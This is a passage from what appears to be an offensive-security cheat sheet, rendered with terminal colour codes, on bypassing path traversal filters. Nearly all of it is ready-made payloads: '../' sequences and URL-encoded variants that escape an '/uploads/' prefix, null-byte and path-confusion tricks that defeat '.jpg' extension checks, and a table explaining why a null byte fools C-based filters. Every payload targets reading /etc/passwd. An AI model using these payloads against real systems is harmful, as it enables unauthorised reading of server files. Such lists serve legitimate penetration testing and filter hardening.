[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Wrapper Bypass                                                           [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **If path MUST start with /uploads/:**                                       [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m /uploads/../../../etc/passwd                                                 [34m│[0m
[34m│[0m /uploads/..%2f..%2f..%2fetc/passwd                                           [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m **If extension MUST be .jpg:**                                               [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m ../../../etc/passwd%00.jpg (null byte - old)                                 [34m│[0m
[34m│[0m ../../../etc/passwd/.jpg (path confusion)                                    [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ### Null Byte Injection                                                      [34m│[0m
[34m│[0m                                                                              [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m Pattern               │ Effect                                               [34m│[0m
[34m│[0m ──────────────────────┼────────────────────────────────────────────          [34m│[0m
[34m│[0m file.php%00.jpg       │ C-based filter sees .jpg, PHP sees .php              [34m│[0m
[34m│[0m ../../../etc/passwd%00│ Truncates appended extension                         [34m│[0m
[34m│[0m ```                                                                          [34m│[0m
[34m│[0m                                                                              [34m│[0m
